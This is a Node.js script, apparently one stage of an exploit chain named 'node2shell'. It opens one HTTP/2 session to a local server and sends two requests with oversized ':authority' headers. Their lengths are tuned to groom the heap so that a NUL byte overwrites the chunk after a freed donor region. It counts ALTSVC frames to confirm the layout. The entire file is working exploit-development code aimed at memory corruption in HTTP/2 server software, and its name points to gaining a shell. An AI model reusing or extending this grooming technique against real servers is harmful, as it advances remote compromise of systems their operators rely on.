'use strict';
// node2shell — two requests on ONE http2 session, for the multi-request
// hole-grooming inventory (wake 6, rung-4 step 1).
//   argv: port, authority length req1 (default 2208), inter-request delay
//   ms (default 1500), authority length req2 (default = req1 length).
//   LEN2 exists for exact-fit donor grooming: request 1 frees a
//   consolidated donor region; request 2's origin sized to the donor
//   exact-fits it (no remainder) so the NUL lands on whatever chunk
//   follows the donor.
// Prints ALTSVC-n markers per received ALTSVC frame.
const http2 = require('http2');
const port = Number(process.argv[2]);
const n1 = Number(process.argv[3] || 2208);
const delay = Number(process.argv[4] || 1500);
const n2 = Number(process.argv[5] || n1);
const client = http2.connect('http://127.0.0.1:' + port);
client.on('error', (e) => { console.log('CLIENT-ERROR ' + e.message); process.exit(1); });
let hits = 0;
client.on('altsvc', (alt, origin, stream) => {
  hits++;
  console.log('ALTSVC-' + hits + ' origin_len=' + origin.length);
});
function send(tag, n) {
  const req = client.request({ ':authority': 'a'.repeat(n), ':path': '/' + tag, ':method': 'GET' });
  req.resume();
  req.on('error', () => {});
}
send('r1', n1);
setTimeout(() => send('r2', n2), delay);
setTimeout(() => {
  console.log('DONE hits=' + hits);
  process.exit(hits >= 2 ? 0 : 2);
}, delay + 6000);
